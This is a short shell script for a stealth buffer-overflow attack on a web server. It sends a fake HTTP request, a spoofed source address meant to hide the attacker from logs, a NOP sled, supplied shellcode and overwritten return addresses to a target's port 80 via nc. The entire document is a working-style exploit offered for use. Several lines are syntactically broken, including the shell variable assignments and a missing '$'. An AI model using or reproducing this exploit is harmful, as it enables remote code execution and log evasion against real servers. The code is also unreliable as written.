#!/bin/sh
#IP spoofing and stealth exploitation silent evades from
# log file and spoof IP in memory

if [ -z "$2" ];then
  echo "Usage : $0 <shellcode> <target IP>"
  exit
fi

SPOOFIP   = "12.34.56.78"
SPOOFPORT = "8990"
FAKEREQ   = "GET / HTTP/1.1\x00"
FRSIZE    = `echo "$FAKEREQ" | wc -c | cut -d'' -f1`
OFFSET    = 540
RETADDR   = "\x24\xf6\xff\xbf"
FAKEADDR  = "\xcf\xf5\xff\xbf"
SIZE      = `wc -c $1 | cut -d'' -f1`
SLED      = $(($OFFSET+4) - (32*4) - $FRSIZE - 16 - $SIZE )

echo "target IP    : $2"
echo "Shellcode    : $1 ($SIZE)"
echo "Fake Request : \"$FAKEREQ\" ($FRSIZE B)"
echo "[FAKE REQ $FRSIZE B] [SPOOF IP 16] [NOP $SLED] [SHELLCODE $SIZE] [RET 128] [*FAKEADDR 8]"

(perl -e "print \"$FAKEREQ\"";
./addr_struct "$SPOOFIP" "SPOOFPORT";
perl -e "print \"\x90\"x$SLED";
cat $1;
perl -e "print \"$RETADDR\"x32 . \"$FAKEADDR\"x2 . \"\x01\x00\x00\x00\r\n\"";) | nc -w 1 -v $2 80
